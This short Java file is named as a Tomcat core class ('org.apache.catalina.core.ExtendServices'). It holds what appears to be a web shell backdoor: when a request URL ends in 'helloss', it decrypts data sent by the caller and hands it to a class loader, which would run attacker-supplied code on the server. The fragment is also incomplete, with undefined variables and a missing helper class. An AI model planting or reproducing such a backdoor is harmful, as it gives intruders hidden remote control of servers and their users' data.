package org.apache.catalina.core;

public class ExtendServices {
    //我总觉得有个接口更好 鉴定为java写多了

    public static void doServices(java.util.Map rdd,Object obj){
        if(((String)rdd.get("url")).matches("/(.*)helloss")) {
            org.apache.catalina.core.utils.Util.extendClassLoader(c.doFinal(data));
        }
    }

}
